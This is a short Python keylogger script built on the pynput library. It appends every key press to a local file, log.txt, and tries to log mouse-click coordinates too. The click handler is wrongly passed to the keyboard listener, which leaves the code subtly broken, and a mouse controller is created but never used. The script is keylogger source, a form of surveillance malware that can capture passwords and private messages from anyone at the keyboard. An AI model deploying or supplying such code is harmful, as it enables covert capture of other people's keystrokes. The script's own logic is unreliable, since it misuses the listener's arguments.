import pynput
from pynput.keyboard import Key, Listener
from pynput.mouse import Button, Controller

mouse = Controller()
log_file = "log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write("{}\n".format(key))

def on_click(x, y, button, pressed):
    with open(log_file, "a") as f:
        if pressed:
            f.write("{} {}\n".format(x, y))

with Listener(on_press=on_press, on_click=on_click) as listener:
    listener.join()